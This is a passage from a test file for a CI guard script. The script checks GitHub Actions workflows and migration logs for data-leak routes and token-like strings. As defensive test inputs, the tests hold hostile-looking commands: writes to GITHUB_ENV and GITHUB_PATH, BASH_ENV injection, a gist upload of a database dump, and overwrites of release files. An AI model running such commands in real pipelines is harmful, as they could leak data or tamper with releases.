    const allowlist = loadRunAllowlist();
    const publish = collectWorkflowUnits(release).units.find((u) => u.job === "release" && u.id === "publish");
    if (!publish) throw new Error("release.yml publish step missing");
    expect(isUnitAllowlisted("release.yml", publish, allowlist)).toBe(true);

    expect(
      isUnitAllowlisted(
        "release.yml",
        { ...publish, stepCanon: { ...publish.stepCanon, env: { ...(publish.stepCanon?.env ?? {}), LEAK: "1" } } },
        allowlist,
      ),
    ).toBe(false);
    expect(
      isUnitAllowlisted("release.yml", { ...publish, stepCanon: { ...publish.stepCanon, shell: "bash" } }, allowlist),
    ).toBe(false);
    expect(
      isUnitAllowlisted(
        "release.yml",
        { ...publish, stepCanon: { ...publish.stepCanon, "working-directory": "/tmp" } },
        allowlist,
      ),
    ).toBe(false);
    expect(
      isUnitAllowlisted(
        "release.yml",
        { ...publish, wfCanon: { ...publish.wfCanon, on: { pull_request_target: {} } } },
        allowlist,
      ),
    ).toBe(false);
    expect(
      isUnitAllowlisted(
        "release.yml",
        {
          ...publish,
          job: "leak",
          jobCanon: { ...publish.jobCanon, env: { ...(publish.jobCanon?.env ?? {}), BUNDLE: "/tmp/leak" } },
        },
        allowlist,
      ),
    ).toBe(false);

    const envEdit = wf("- id: s\n  run: echo hi\n  env:\n    FOO: bar");
    const envUnit = collectWorkflowUnits(envEdit).units[0];
    const envEntry = {
      file: "t.yml",
      job: "t",
      id: "s",
      sha256: unitHash({ ...envUnit, stepCanon: { ...envUnit.stepCanon, env: null } }),
    };
    expect(findForbiddenUploadCommands(envEdit, "t.yml", { allowlist: [envEntry] }).map((h) => h.kind)).toContain(
      "step allowlist",
    );

    const shellEdit = wf("- id: s\n  shell: bash\n  run: echo hi");
    const shellUnit = collectWorkflowUnits(shellEdit).units[0];
    const shellEntry = {
      file: "t.yml",
      job: "t",
      id: "s",
      sha256: unitHash({ ...shellUnit, stepCanon: { ...shellUnit.stepCanon, shell: null } }),
    };
    expect(findForbiddenUploadCommands(shellEdit, "t.yml", { allowlist: [shellEntry] }).map((h) => h.kind)).toContain(
      "step allowlist",
    );

    const wdEdit = wf("- id: s\n  working-directory: /tmp\n  run: echo hi");
    const wdUnit = collectWorkflowUnits(wdEdit).units[0];
    const wdEntry = {
      file: "t.yml",
      job: "t",
      id: "s",
      sha256: unitHash({ ...wdUnit, stepCanon: { ...wdUnit.stepCanon, "working-directory": null } }),
    };
    expect(findForbiddenUploadCommands(wdEdit, "t.yml", { allowlist: [wdEntry] }).map((h) => h.kind)).toContain(
      "step allowlist",
    );

    const copied = [
      "on: push",
      "jobs:",
      "  a:",
      "    runs-on: ubuntu-latest",
      "    env:",
      "      BUNDLE: src-tauri/target/universal-apple-darwin/release/bundle",
      "    steps:",
      "      - id: p",
      "        run: echo ok",
      "  leak:",
      "    runs-on: ubuntu-latest",
      "    env:",
      "      BUNDLE: /tmp/leak",
      "    steps:",
      "      - id: p",
      "        run: echo ok",
      "",
    ].join("\n");
    const copiedUnits = collectWorkflowUnits(copied).units;
    const honest = copiedUnits.find((u) => u.job === "a");
    const leak = copiedUnits.find((u) => u.job === "leak");
    if (!honest || !leak) throw new Error("copied BUNDLE jobs missing");
    const honestEntry = { file: "t.yml", job: "a", id: "p", sha256: unitHash(honest) };
    expect(findForbiddenUploadCommands(copied, "t.yml", { allowlist: [honestEntry] }).map((h) => h.kind)).toContain(
      "step allowlist",
    );
    expect(isUnitAllowlisted("t.yml", leak, [honestEntry])).toBe(false);
    expect(unitHash(leak)).not.toBe(unitHash(honest));

    const prt = wf("- id: s\n  run: echo hi", { on: "pull_request_target" });
    expect(findForbiddenUploadCommands(prt, "t.yml").map((h) => h.kind)).toContain("step allowlist");
    const pushUnit = collectWorkflowUnits(wf("- id: s\n  run: echo hi")).units[0];
    const pushEntry = { file: "t.yml", job: "t", id: "s", sha256: unitHash(pushUnit) };
    expect(findForbiddenUploadCommands(prt, "t.yml", { allowlist: [pushEntry] }).map((h) => h.kind)).toContain(
      "step allowlist",
    );
  });

  it("100f: GITHUB_ENV/PATH, interpreters, github-script, reusable workflow, BASH_ENV/ENV", () => {
    expect(writesGithubEnv('echo x >> "$GITHUB_ENV"')).toBe(true);
    expect(writesGithubPath("echo /opt >> $GITHUB_PATH")).toBe(true);
    expect(writesGithubEnv('fs.appendFileSync(process.env.GITHUB_ENV, "x=1")')).toBe(true);
    expect(hasForbiddenEnvAssignment("export BASH_ENV=/tmp/x")).toBe(true);

    const envWrites = [
      'echo LEAK=1 >> "$GITHUB_ENV"',
      "echo /tmp >> $GITHUB_PATH",
      'python3 -c \'open(os.environ["GITHUB_ENV"],"a").write("x=1")\'',
      "node -e 'require(\"fs\").appendFileSync(process.env.GITHUB_ENV,\"x=1\")'",
    ];
    for (const cmd of envWrites) {
      const kinds = findForbiddenUploadCommands(wf(`- id: s\n  run: ${JSON.stringify(cmd)}`), "t.yml").map(
        (h) => h.kind,
      );
      expect(kinds, cmd).toEqual(expect.arrayContaining(["step allowlist"]));
      expect(kinds, cmd).toEqual(
        expect.arrayContaining([expect.stringMatching(/GITHUB_ENV|GITHUB_PATH/)]),
      );
    }

    const interpreters = [
      "python3 -c 'open(\"dump.sql\",\"w\").write(\"x\")'",
      "node -e 'require(\"fs\").writeFileSync(\"dump.sql\",\"x\")'",
      "perl -e 'open F,\">dump.sql\"'",
      "awk 'BEGIN{system(\"gh gist create dump.sql\")}'",
      "make upload",
      "git -c filter.leak.smudge=cat dump.sql",
      "npm run leak",
    ];
    for (const cmd of interpreters) {
      expect(
        findForbiddenUploadCommands(wf(`- id: s\n  run: ${JSON.stringify(cmd)}`), "t.yml").map((h) => h.kind),
        cmd,
      ).toContain("step allowlist");
    }

    const script = [
      "on: push",
      "jobs:",
      "  t:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - id: s",
      "        uses: actions/github-script@v7",
      "        with:",
      "          script: |",
      "            require('fs').appendFileSync(process.env.GITHUB_ENV, 'x=1')",
      "",
    ].join("\n");
    expect(findForbiddenUploadCommands(script, "t.yml").map((h) => h.kind)).toEqual(
      expect.arrayContaining(["step allowlist", "GITHUB_ENV"]),
    );

    const reusable = [
      "on: push",
      "jobs:",
      "  leak:",
      "    uses: owner/repo/.github/workflows/upload.yml@main",
      "",
    ].join("\n");
    const reusableUnit = collectWorkflowUnits(reusable).units[0];
    expect(reusableUnit?.kind).toBe("job-uses");
    expect(reusableUnit?.uses).toMatch(/upload\.yml/);
    expect(findForbiddenUploadCommands(reusable, "t.yml").map((h) => h.kind)).toContain("step allowlist");

    const bashEnv = [
      "on: push",
      "jobs:",
      "  t:",
      "    runs-on: ubuntu-latest",
      "    env:",
      "      BASH_ENV: /tmp/leak.sh",
      "    steps:",
      "      - id: s",
      "        run: echo hi",
      "        env:",
      "          ENV: /tmp/posix.sh",
      "",
    ].join("\n");
    const unit = collectWorkflowUnits(bashEnv).units[0];
    const entry = { file: "t.yml", job: "t", id: "s", sha256: unitHash(unit) };
    expect(findForbiddenUploadCommands(bashEnv, "t.yml", { allowlist: [entry] }).map((h) => h.kind)).toEqual(
      expect.arrayContaining(["BASH_ENV", "ENV key"]),
    );
    expect(
      findForbiddenUploadCommands(wf("- id: s\n  run: export BASH_ENV=/tmp/x"), "t.yml").map((h) => h.kind),
    ).toEqual(expect.arrayContaining(["step allowlist", "BASH_ENV"]));
  });

  it("100g: release-path writes via mv/install/dd/rsync/ln/sed/python/cp-to-var", () => {
    const writes = [
      'mv dump.sql "$DMG"',
      'install -m 644 dump "$BUNDLE"/dmg/leak.dmg',
      "dd if=dump.sql of=latest.json",
      "rsync dump.sql latest.json",
      "ln -s dump.sql RELEASE_NOTES.md",
      "sed -i s/x/y/ RELEASE_NOTES.md",
      "python3 -c 'open(\"RELEASE_NOTES.md\",\"w\").write(\"x\")'",
      'OUT=RELEASE_NOTES.md; cp dump.sql "$OUT"',
      'cp dump.sql "$STABLE_DMG"',
    ];
    for (const cmd of writes) {
      expect(hasReleasePathWrite(cmd), cmd).toBe(true);
      const kinds = findForbiddenUploadCommands(wf(`- id: s\n  run: ${JSON.stringify(cmd)}`), "release.yml").map(
        (h) => h.kind,
      );
      expect(kinds, cmd).toEqual(expect.arrayContaining(["step allowlist", "release write"]));
      expect(
        findForbiddenUploadCommands(runYaml(cmd), "cutover-migrate.yml").map((h) => h.kind),
        cmd,
      ).toContain("release write");
    }
  });

  it("100h: container on release job, deleted/reordered/duplicated steps, extra job", () => {
    const release = readFileSync(join(ROOT, ".github/workflows/release.yml"), "utf8");
    const allowlist = loadRunAllowlist();
    expect(findForbiddenUploadCommands(release, "release.yml", { allowlist })).toEqual([]);

    const withContainer = release.replace(
      /  release:\n    needs: changes/,
      "  release:\n    container: evil\n    needs: changes",
    );
    expect(findForbiddenUploadCommands(withContainer, "release.yml", { allowlist }).map((h) => h.kind)).toContain(
      "step allowlist",
    );

    const deletedSigning = release.replace(/\n      - id: signing\n[\s\S]*?(?=\n      - id: release-notes)/, "\n");
    expect(findForbiddenUploadCommands(deletedSigning, "release.yml", { allowlist }).map((h) => h.kind)).toContain(
      "job step ids",
    );

    const cutover = readFileSync(join(ROOT, ".github/workflows/cutover-migrate.yml"), "utf8");
    const deletedAssert = cutover.replace(/\n      - id: assert-logs\n[\s\S]*?(?=\n      # Guard:)/, "\n");
    expect(findForbiddenUploadCommands(deletedAssert, "cutover-migrate.yml", { allowlist }).map((h) => h.kind)).toContain(
      "job step ids",
    );

    const publishBlock = release.match(/\n      - id: publish\n[\s\S]*?(?=\n      - id: record-sha)/)?.[0];
    if (!publishBlock) throw new Error("publish block missing");
    const reordered = release.replace(publishBlock, "\n").replace(
      /(\n      - id: checkout\n        uses: actions\/checkout[^\n]+\n        with:\n          fetch-depth: 0\n\n      - id: setup-node)/,
      `${publishBlock}$1`,
    );
    expect(findForbiddenUploadCommands(reordered, "release.yml", { allowlist }).map((h) => h.kind)).toContain(
      "job step ids",
    );

    const duplicated = release.replace(
      /(\n      - id: publish\n)/,
      "$1        name: First publish\n        run: echo one\n      - id: publish\n",
    );
    expect(findForbiddenUploadCommands(duplicated, "release.yml", { allowlist }).map((h) => h.kind)).toEqual(
      expect.arrayContaining(["duplicate step id", "job step ids"]),
    );

    const extraJob = `${release.trimEnd()}\n  sneak:\n    runs-on: ubuntu-latest\n    steps:\n      - id: x\n        run: echo hi\n`;
    expect(findForbiddenUploadCommands(extraJob, "release.yml", { allowlist }).map((h) => h.kind)).toEqual(
      expect.arrayContaining(["workflow jobs", "step allowlist", "job step ids"]),
    );

    const timeout = wf("- id: s\n  timeout-minutes: 5\n  run: echo hi");
    const base = collectWorkflowUnits(wf("- id: s\n  run: echo hi")).units[0];
    const timed = collectWorkflowUnits(timeout).units[0];
    expect(unitHash(timed)).not.toBe(unitHash(base));
    expect(
      findForbiddenUploadCommands(timeout, "t.yml", {
        allowlist: [{ file: "t.yml", job: "t", id: "s", sha256: unitHash(base) }],
      }).map((h) => h.kind),
    ).toContain("step allowlist");

    const runName = wf("- id: s\n  run: echo hi").replace("on: push", "run-name: leak\non: push");
    const plain = collectWorkflowUnits(wf("- id: s\n  run: echo hi")).units[0];
    expect(
      findForbiddenUploadCommands(runName, "t.yml", {
        allowlist: [{ file: "t.yml", job: "t", id: "s", sha256: unitHash(plain) }],
      }).map((h) => h.kind),
    ).toContain("step allowlist");

    expect(listHash(["a", "b"])).not.toBe(listHash(["b", "a"]));
    expect(listHash(["a", "b"])).not.toBe(listHash(["a"]));
  });

  it("pins third-party actions to full commit SHAs and requires CODEOWNERS review", () => {
    const dir = join(ROOT, ".github/workflows");
    for (const name of ["checks.yml", "cutover-migrate.yml", "ios-release.yml", "release.yml"]) {
      for (const unit of collectSteps(readFileSync(join(dir, name), "utf8"))) {
        if (!unit.uses) continue;
        expect(unit.uses, `${name} ${unit.id}`).toMatch(/@[0-9a-f]{40}\b/i);
      }
    }
    const owners = readFileSync(join(ROOT, ".github/CODEOWNERS"), "utf8");
    expect(owners).toMatch(/scripts\/guard-public-ci\.allowlist\.json\s+@phillipchan1/);
    expect(owners).toMatch(/scripts\/guard-public-ci\.mjs\s+@phillipchan1/);
    expect(owners).toMatch(/scripts\/regen-public-ci-allowlist\.mjs\s+@phillipchan1/);
    expect(owners).toMatch(/tests\/guard-public-ci\.test\.ts\s+@phillipchan1/);
    expect(owners).toMatch(/package\.json\s+@phillipchan1/);
    expect(owners).toMatch(/package-lock\.json\s+@phillipchan1/);
    expect(owners).toMatch(/\.github\/CODEOWNERS\s+@phillipchan1/);
    expect(owners).toMatch(/\.github\/actions\/\s+@phillipchan1/);
    expect(owners).toMatch(/\.github\/workflows\/\s+@phillipchan1/);
  });

  it("rejects a multi-path dump + hash upload", () => {
    expect(() =>
      assertWorkflowUploadAllowlist(
        [
          "uses: actions/upload-artifact@sha",
          "with:",
          "  path: |",
          "    artifacts/nuvo-source.dump",
          "    artifacts/nuvo-source.sha256",
          "",
        ].join("\n"),
        "dump.yml",
      ),
    ).toThrow(/nuvo-source\.dump/);
  });

  it("treats dump/CSV paths as data uploads, not the report", () => {
    expect(looksLikeDataUpload("artifacts/nuvo-source.dump")).toBe(true);
    expect(looksLikeDataUpload("artifacts/auth-users.csv")).toBe(true);
    expect(looksLikeDataUpload("artifacts/cutover-report.md")).toBe(false);
  });

  it("fails if anything other than the report is staged", () => {
    expect(() => assertStagedUpload(["artifacts/nuvo-source.dump"], { publicRepo: true })).toThrow(
      /public repo refuses data upload/,
    );
    expect(() => assertStagedUpload(["artifacts/cutover-report.md", "extra.csv"])).toThrow(
      /not allowlisted/,
    );
    expect(assertStagedUpload("artifacts/cutover-report.md", { publicRepo: true })).toEqual([
      "artifacts/cutover-report.md",
    ]);
  });

  it("fails when a dump sits in the workspace artifacts folder", () => {
    const dir = tmp();
    mkdirSync(join(dir, "artifacts"), { recursive: true });
    writeFileSync(join(dir, "artifacts", "cutover-report.md"), "# ok\n");
    assertWorkspaceHasNoDataFiles(dir);
    writeFileSync(join(dir, "artifacts", "nuvo-source.dump"), "not-a-real-dump");
    expect(() => assertWorkspaceHasNoDataFiles(dir)).toThrow(/nuvo-source\.dump/);
  });

  it("treats emails/CSV as row data and checksum tables as safe", () => {
    expect(logLooksLikeRowData("phil@example.com,not-a-real-hash")).toBe(true);
    expect(
      logLooksLikeRowData("| tasks | 1 | 1 | aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa |"),
    ).toBe(false);
    assertSafeMigrateLog("  tasks: source=1 target=1 hash aaa → aaa", "count/hash log");
    expect(() => assertSafeMigrateLog("id,email\naaaa,phil@example.com\n", "csv")).toThrow(
      /row data/,
    );
  });

  it("flags Google refresh tokens (1//0...)", () => {
    expect(logLooksLikeRowData("refresh 1//0gK1aBcDeFgHiJkLmNoPqRs")).toBe(true);
    expect(() => assertSafeMigrateLog("1//0gK1aBcDeFgHiJkLmNoPqRs", "refresh")).toThrow(/row data/);
  });

  it("flags Google access tokens (ya29.)", () => {
    expect(logLooksLikeRowData("access ya29.a0AfH6SMCexampletokenvalue")).toBe(true);
  });

  it("flags hex bytea (\\\\x...)", () => {
    expect(logLooksLikeRowData("enc \\x1f8b080000000000")).toBe(true);
  });

  it("flags <Buffer ...>", () => {
    expect(logLooksLikeRowData("iv <Buffer 1f 8b 08 00 00 00>")).toBe(true);
  });

  it("flags JWTs", () => {
    expect(
      logLooksLikeRowData(
        "bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.sigpayload",
      ),
    ).toBe(true);
  });

  it("flags 40+ char hex and keeps dump sha256= lines safe", () => {
    expect(logLooksLikeRowData("token " + "ab".repeat(20))).toBe(true);
    expect(
      logLooksLikeRowData(
        "verified backup: 12 bytes sha256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (runner only, not uploaded)",
      ),
    ).toBe(false);
  });

  it("flags pg parameters: [ dumps", () => {
    expect(logLooksLikeRowData("DETAIL:  parameters: [$1, $2]")).toBe(true);
  });

  it("asserts teed cutover logs and fails on row data", () => {
    const dir = tmp();
    expect(() => assertCutoverLogDir(join(dir, "missing"))).toThrow(/log dir missing/);
    writeFileSync(join(dir, "dump.log"), "verified backup: 12 bytes sha256=abc (runner only, not uploaded)\n");
    expect(assertCutoverLogDir(dir)).toEqual(["dump.log"]);
    writeFileSync(join(dir, "restore.log"), "auth map leaked phil@example.com\n");
    expect(() => assertCutoverLogDir(dir)).toThrow(/row data/);
  });

  it("exits non-zero when --check-log is pointed at a missing dir", () => {
    const missing = join(tmp(), "no-such-logs");
    const result = spawnSync(process.execPath, [join(ROOT, "scripts/guard-public-ci.mjs"), "--check-log", missing], {
      encoding: "utf8",
    });
    expect(result.status).not.toBe(0);
    expect(`${result.stderr}${result.stdout}`).toMatch(/log dir missing/);
  });

  it("cutover workflow never uploads a dump and always shreds", () => {
    const workflow = readFileSync(join(ROOT, ".github/workflows/cutover-migrate.yml"), "utf8");
    expect(workflow).not.toMatch(/nuvo-source-dump/);
    expect(workflow).toMatch(/NEVER upload/);
    expect(workflow).toMatch(/CUTOVER_DUMP_DIR/);
    expect(workflow).toMatch(/CUTOVER_LOG_DIR/);
    expect(workflow).not.toMatch(/CUTOVER_DUMP_DIR:\s*\$\{\{\s*runner\.temp/);
    expect(workflow).not.toMatch(/CUTOVER_LOG_DIR:\s*\$\{\{\s*runner\.temp/);
    expect(workflow).toMatch(/echo "CUTOVER_DUMP_DIR=\$RUNNER_TEMP\/nuvo-cutover" >> "\$GITHUB_ENV"/);
    expect(workflow).toMatch(/echo "CUTOVER_LOG_DIR=\$RUNNER_TEMP\/nuvo-cutover-logs" >> "\$GITHUB_ENV"/);
    const dirsAt = workflow.indexOf("id: cutover-dirs");
    const assertAt = workflow.indexOf("id: assert-logs");
    const shredAt = workflow.indexOf("id: shred");
    expect(dirsAt).toBeGreaterThan(workflow.indexOf("id: checkout"));
    expect(assertAt).toBeGreaterThan(dirsAt);
    expect(shredAt).toBeGreaterThan(dirsAt);
    expect(workflow).toContain("id: shred\n        name: Shred dumps\n        if: ${{ always() }}");
    expect(workflow).toMatch(/CUTOVER_DUMP_DIR:-\$\{RUNNER_TEMP\}\/nuvo-cutover/);
    expect(workflow).toMatch(/CUTOVER_LOG_DIR:-\$\{RUNNER_TEMP\}\/nuvo-cutover-logs/);
    expect(workflow).toMatch(/migration_tmp\.auth_users\(\)/);
    expect(workflow).toMatch(/migration_tmp\.auth_identities\(\)/);
    expect(workflow).toMatch(/AUTH_USERS_SRC_HASH_SQL/);
    expect(workflow).toMatch(/AUTH_IDENT_DST_HASH_SQL/);
    expect(workflow).toMatch(/auth_parity/);
    expect(workflow.match(/COALESCE\(updated_at, created_at\)/g)?.length).toBe(2);
    expect(workflow).toMatch(/name: Shred dumps/);
    expect(workflow).toMatch(/id: guard/);
    expect(workflow).toMatch(/id: assert-logs/);
    expect(workflow).toMatch(/id: setup-node/);
    expect(workflow).toMatch(/persist-credentials: false/);
    expect(workflow).toMatch(/id: seal-tokens/);
    expect(workflow).toMatch(/id: resync/);
    expect(workflow).toMatch(/steps\.guard\.outcome == 'success'/);
    expect(workflow).toMatch(/--check-log/);
    expect(workflow).toContain("name: Assert cutover logs have no row data\n        if: ${{ always() }}");
    expect(workflow).not.toMatch(/steps\.dump\.outcome/);
    expect(workflow).toMatch(/\|\s*tee "/);
    expect(workflow).toMatch(/shred/);
    expect(workflow).toMatch(/scripts\/guard-public-ci\.mjs --job/);
    expect(workflow).toMatch(/default_transaction_read_only=on/);
    expect(workflow).toMatch(/CUTOVER nuvo/);
    expect(workflow).not.toMatch(/SELECT COUNT\(\*\) FROM auth\.users/);
    expect(workflow).not.toMatch(/SELECT COUNT\(\*\) FROM auth\.identities/);
    expect(workflow).not.toMatch(/console\.log\([^)]*\.email/);
  });

  it("checks.yml runs the allowlist guard", () => {
    const checks = readFileSync(join(ROOT, ".github/workflows/checks.yml"), "utf8");
    expect(checks).toMatch(/scripts\/guard-public-ci\.mjs/);
    expect(checks).toMatch(/id: actionlint/);
    expect(checks).toMatch(/ACTIONLINT_VERSION: "1\.7\.12"/);
    expect(checks).toMatch(/ACTIONLINT_SHA256: "8aca8db96f1b94770f1b0d72b6dddcb1ebb8123cb3712530b08cc387b349a3d8"/);
    expect(checks).toMatch(/sha256sum -c -/);
    expect(checks).toMatch(/SHELLCHECK_OPTS: "-S warning"/);
    expect(checks).toMatch(/SHELLCHECK_VERSION: "0\.11\.0"/);
    expect(checks).toMatch(/SHELLCHECK_SHA256: "8c3be12b05d5c177a04c29e3c78ce89ac86f1595681cab149b65b97c4e227198"/);
    expect(checks).toMatch(/\/tmp\/actionlint -color$/m);
    expect(checks).not.toMatch(/-shellcheck=/);
    expect(checks).toMatch(/permissions:\n  contents: read/);
    expect(checks.match(/persist-credentials: false/g)?.length).toBe(2);
    expect(checks).not.toMatch(/branches-ignore:/);
  });

  it("cutover docs name migration_tmp and the post-cutover drop", () => {
    const doc = readFileSync(join(ROOT, "docs/cloudflare-cutover.md"), "utf8");
    expect(doc).toMatch(/migration_tmp\.auth_users\(\)/);
    expect(doc).toMatch(/migration_tmp\.auth_identities\(\)/);
    expect(doc).toMatch(/cloudflare-migration\/migration_tmp\.sql/);
    expect(doc).toMatch(/SECURITY DEFINER/);
    expect(doc).toMatch(/migration_reader/);
    expect(doc).toMatch(/permission denied for schema auth/);
    expect(doc).toMatch(/vault_tokens/);
    expect(doc).toMatch(/supabase_admin/);
    expect(doc).toMatch(/DROP SCHEMA migration_tmp CASCADE/);
    expect(doc).toMatch(/Engineer 3/);
    expect(doc).toMatch(/public,graphql_public/);
    expect(doc).not.toMatch(/dump is uploaded/);
    expect(doc).toMatch(/never uploaded/);
    expect(doc).toMatch(/cutover-report\.md/);
    expect(doc).toMatch(/freeze\.sql/);
    expect(doc).toMatch(/unfreeze\.sql/);
    expect(doc).toMatch(/source-snapshot\.json/);
    expect(doc).toMatch(/VITE_MAINTENANCE_URL/);
    expect(doc).toMatch(/WRITE_FREEZE/);
    expect(doc).toMatch(/sync_log/);
    expect(doc).toMatch(/anti-join/);
  });

  it("commits the live prod function bodies outside supabase/migrations", () => {
    const sql = readFileSync(join(ROOT, "docs/cloudflare-migration/migration_tmp.sql"), "utf8");
    expect(sql).toMatch(/CREATE SCHEMA IF NOT EXISTS migration_tmp/);
    expect(sql).toContain(
      "SELECT u.id, pg_catalog.jsonb_strip_nulls(pg_catalog.jsonb_build_object('name', u.raw_user_meta_data->>'name', 'full_name', u.raw_user_meta_data->>'full_name')), u.email::text, u.email_confirmed_at, u.created_at, u.updated_at FROM auth.users u",
    );
    expect(sql).toContain(
      "SELECT i.id, i.user_id, i.provider::text, pg_catalog.jsonb_strip_nulls(pg_catalog.jsonb_build_object('sub', i.identity_data->>'sub', 'provider_id', i.identity_data->>'provider_id')), i.provider_id::text, i.created_at, i.updated_at FROM auth.identities i",
    );
    expect(sql).toMatch(/SET search_path TO ''/);
    expect(sql).toMatch(/ALTER FUNCTION migration_tmp\.auth_users\(\) OWNER TO postgres/);
    expect(sql).toMatch(/ALTER FUNCTION migration_tmp\.auth_identities\(\) OWNER TO postgres/);
    expect(sql).toMatch(/REVOKE ALL ON SCHEMA migration_tmp FROM PUBLIC/);
    expect(sql).toMatch(/REVOKE EXECUTE ON FUNCTION migration_tmp\.auth_users\(\)/);
    expect(sql).toMatch(/GRANT USAGE ON SCHEMA migration_tmp TO migration_reader/);
    expect(sql).toMatch(/GRANT EXECUTE ON FUNCTION migration_tmp\.auth_users\(\) TO migration_reader/);
    expect(sql).toMatch(/GRANT USAGE ON SCHEMA auth TO postgres/);
    expect(sql).toMatch(/GRANT SELECT \(\s*id,\s*raw_user_meta_data,\s*email,\s*email_confirmed_at,\s*created_at,\s*updated_at\s*\) ON TABLE auth\.users TO postgres/);
    expect(sql).toMatch(/GRANT SELECT \(\s*id,\s*user_id,\s*provider,\s*identity_data,\s*provider_id,\s*created_at,\s*updated_at\s*\) ON TABLE auth\.identities TO postgres/);
    expect(sql).toMatch(/supabase_admin/);
    expect(sql).not.toMatch(/GRANT USAGE ON SCHEMA auth TO migration_reader/);
    expect(sql).toMatch(/DROP SCHEMA migration_tmp CASCADE/);
    expect(sql).toMatch(/Engineer 3/);
    expect(sql).toMatch(/public,graphql_public/);
    expect(sql).toMatch(/has_function_privilege\('migration_reader'/);
    expect(sql).not.toMatch(/encrypted_password|recovery_token|confirmation_token/);
    const migrations = readFileSync(join(ROOT, "docs/cloudflare-migration/migration_tmp.sql"), "utf8");
    expect(migrations).toMatch(/NOT a supabase\/migrations file/);
  });
});

describe("public-ci-guard .github layout", () => {
  function fakeGithub(entries: Record<string, string | "dir" | { symlink: string }>) {
    const github = join(tmp(), ".github");
    mkdirSync(github, { recursive: true });
    for (const [rel, body] of Object.entries(entries)) {
      const dest = join(github, rel);
      mkdirSync(join(dest, ".."), { recursive: true });
      if (body === "dir") mkdirSync(dest, { recursive: true });
      else if (typeof body === "object" && body && "symlink" in body) symlinkSync(body.symlink, dest);
      else writeFileSync(dest, body);
    }
    return github;
  }

  const miniWorkflow = "on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - id: s\n        run: echo hi\n";
  const miniAction = [
    "name: demo",
    "runs:",
    "  using: composite",
    "  steps:",
    "    - id: s",
    "      run: echo hi",
    "      shell: bash",
    "",
  ].join("\n");

  it("accepts the committed .github tree and resolves workflows/ to .github", () => {
    const github = join(ROOT, ".github");
    const layout = assertGithubCiLayout(github);
    expect(layout.workflows).toEqual([
      "workflows/checks.yml",
      "workflows/cutover-migrate.yml",
      "workflows/ios-release.yml",
      "workflows/release.yml",
    ]);
    expect(layout.actions).toEqual([]);
    expect(resolveGithubDir(join(github, "workflows"))).toBe(github);
    expect(resolveGithubDir(github)).toBe(github);
    expect(allowlistFileName("workflows/checks.yml")).toBe("checks.yml");
    expect(allowlistFileName("actions/foo/action.yml")).toBe("actions/foo/action.yml");
  });

  it("fails closed on evil.YML in workflows", () => {
    const github = fakeGithub({
      "workflows/ok.yml": miniWorkflow,
      "workflows/evil.YML": miniWorkflow,
    });
    expect(() => assertGithubCiLayout(github)).toThrow(/evil\.YML/);
    expect(() => neededAllowlist(github)).toThrow(/evil\.YML/);
    expect(() => assertWorkflowsUploadAllowlist(github)).toThrow(/evil\.YML/);
  });

  it("fails closed on evil.YAML in workflows", () => {
    const github = fakeGithub({
      "workflows/ok.yml": miniWorkflow,
      "workflows/evil.YAML": miniWorkflow,
    });
    expect(() => assertGithubCiLayout(github)).toThrow(/evil\.YAML/);
    expect(() => neededAllowlist(github)).toThrow(/evil\.YAML/);
    expect(() => assertWorkflowsUploadAllowlist(github)).toThrow(/evil\.YAML/);
  });

  it("fails closed on evil.Yml in workflows", () => {
    const github = fakeGithub({
      "workflows/ok.yml": miniWorkflow,
      "workflows/evil.Yml": miniWorkflow,
    });
    expect(() => assertGithubCiLayout(github)).toThrow(/evil\.Yml/);
    expect(() => neededAllowlist(github)).toThrow(/evil\.Yml/);
    expect(() => assertWorkflowsUploadAllowlist(github)).toThrow(/evil\.Yml/);
  });

  it("fails closed when checks.yml is renamed to checks.YML", () => {
    const github = fakeGithub({ "workflows/checks.yml": miniWorkflow });
    renameSync(join(github, "workflows/checks.yml"), join(github, "workflows/checks.YML"));
    expect(existsSync(join(github, "workflows/checks.yml"))).toBe(false);
    expect(existsSync(join(github, "workflows/checks.YML"))).toBe(true);
    expect(() => assertGithubCiLayout(github)).toThrow(/checks\.YML/);
    expect(() => neededAllowlist(github)).toThrow(/checks\.YML/);
    expect(() => assertWorkflowsUploadAllowlist(github)).toThrow(/checks\.YML/);
  });

  it("fails closed on workflows/sub/evil.yml", () => {
    const github = fakeGithub({
      "workflows/ok.yml": miniWorkflow,
      "workflows/sub/evil.yml": miniWorkflow,
    });
    expect(() => assertGithubCiLayout(github)).toThrow(/workflows\/sub\/evil\.yml/);
    expect(() => neededAllowlist(github)).toThrow(/sub\/evil\.yml/);
    expect(() => assertWorkflowsUploadAllowlist(github)).toThrow(/sub\/evil\.yml/);
  });

  it("fails closed on a yaml file elsewhere under .github", () => {
    const github = fakeGithub({
      "workflows/ok.yml": miniWorkflow,
      "sneak.yml": miniWorkflow,
    });
    expect(() => assertGithubCiLayout(github)).toThrow(/sneak\.yml/);
  });

  it("fails closed on action.YML and a non-action yaml under actions/", () => {
    const github = fakeGithub({
      "workflows/ok.yml": miniWorkflow,
      "actions/demo/action.YML": miniAction,
      "actions/demo/evil.yml": miniAction,
    });
    expect(() => assertGithubCiLayout(github)).toThrow(/action\.YML/);
    expect(() => assertGithubCiLayout(github)).toThrow(/evil\.yml/);
  });

  it("fails closed on a symlink workflow", () => {
    const github = fakeGithub({ "workflows/ok.yml": miniWorkflow });
    symlinkSync(join(github, "workflows/ok.yml"), join(github, "workflows/link.yml"));
    const listed = listGithubEntries(github);
    expect(listed.some((e) => e.rel === "workflows/link.yml" && e.kind === "symlink")).toBe(true);
    expect(() => assertGithubCiLayout(github)).toThrow(/link\.yml \(symlink\)/);
  });

  it("hashes composite action steps and applies the same deny rules", () => {
    const leak = [
      "name: leak",
      "runs:",
      "  using: composite",
      "  steps:",
      "    - id: s",
      "      run: export BASH_ENV=/tmp/x",
      "      shell: bash",
      "",
    ].join("\n");
    const units = collectWorkflowUnits(leak);
    expect(units.full).toBe(true);
    expect(units.units[0]?.job).toBe("runs");
    expect(units.units[0]?.id).toBe("s");
    expect(canonicalizeComposite(units.doc)).toMatchObject({ runs: { using: "composite" } });
    expect(findForbiddenUploadCommands(leak, "actions/leak/action.yml").map((h) => h.kind)).toEqual(
      expect.arrayContaining(["BASH_ENV", "step allowlist"]),
    );

    const envWrite = [
      "name: env",
